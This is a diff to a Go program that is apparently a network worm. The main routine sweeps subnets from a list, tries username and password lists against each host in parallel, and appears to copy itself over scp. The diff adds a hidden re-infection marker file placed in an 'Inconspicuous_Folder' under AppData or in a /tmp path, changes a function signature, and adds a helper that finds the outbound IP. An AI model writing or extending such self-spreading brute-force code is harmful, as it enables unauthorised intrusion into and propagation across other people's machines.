@@ -14,10 +14,25 @@ import (
 
 	"github.com/tmc/scp"
 	//"net/http"
+	"net"
+	"io/ioutil"
 )
 func main(){
 	myos := runtime.GOOS
 	startwormingboi(myos)
+	if myos=="windows" {
+		if _, err := os.Stat("\\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\flag.txt"); os.IsNotExist(err) {
+			ioutil.WriteFile("\\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\flag.txt",[]byte("hello"),0644)
+		} else {
+			os.Exit(3)
+		}
+	} else {
+		if _, err := os.Stat("/tmp/config-err-XJM1ll78/flag.txt"); os.IsNotExist(err) {
+			ioutil.WriteFile("/tmp/config-err-XJM1ll78/flag.txt",[]byte("hello"),0644)
+		} else {
+			os.Exit(3)
+		}
+	}
 }
 
 func startwormingboi(myos string) {
@@ -26,6 +41,7 @@ func startwormingboi(myos string) {
 	var passwds = readinfile("passwds.txt")
 	var subnets = readinfile("subnets.txt")
 	var step = readinfile("step.txt")
+
 	start, err := strconv.ParseInt(step[0], 10, 64)
 	if err != nil{
 		log.Fatal(err)
@@ -44,7 +60,7 @@ func startwormingboi(myos string) {
 		for l := start; l <= stop; l=l+stepval{
 			myip = joinstrings(subnets[i],strconv.Itoa(int(l)))
 				wg.Add(1)
-				go gettingin(myip, user, passwds, myos, &wg)
+				go gettingin(myip, user, passwds, &wg)
 
 			}
 			wg.Wait()
@@ -52,7 +68,7 @@ func startwormingboi(myos string) {
 		wg.Wait()
 	 } 
 
-func gettingin(myip string, user []string, passwds []string, myos string, wg *sync.WaitGroup ){
+func gettingin(myip string, user []string, passwds []string, wg *sync.WaitGroup ){
 	n := 0
 	var iswin = false
 	var passbreak = false
@@ -192,4 +208,15 @@ func readinfile(myfile string) (readinarr []string){
         log.Fatal(err)
     }
     return
+}
+func GetOutboundIP() net.IP {
+	conn, err := net.Dial("udp", "8.8.8.8:80")
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer conn.Close()
+
+	localAddr := conn.LocalAddr().(*net.UDPAddr)
+
+	return localAddr.IP
 }
